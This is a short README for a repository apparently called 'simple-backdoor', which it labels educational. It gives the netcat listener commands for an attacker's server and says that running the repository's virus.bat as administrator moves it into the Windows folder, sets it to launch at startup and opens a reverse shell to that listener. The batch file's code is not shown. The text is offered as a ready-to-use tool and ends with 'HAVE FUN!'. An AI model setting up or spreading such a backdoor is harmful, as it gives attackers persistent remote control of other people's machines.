# simple-backdoor
A simple backdoor program. FOR EDUCATIONAL PURPOSE ONLY

---

**REQUIREMENTS:**
 - Linux server with netcat (attcking macine)
 - Windows or linux target machine

**RUN:**

Run the listener on your server via 
<code>server: nc -lvnp 87</code> for linux target and <code>server(tgt=win): stty raw -echo; (stty size; cat) | sudo nc -lvnp 87</code> for windows target

And just run virus.bat as admin and it will migrate to C:\Winsows, set it to run on start and open a simple reverse-shell on the Windows machine

**HAVE FUN!**
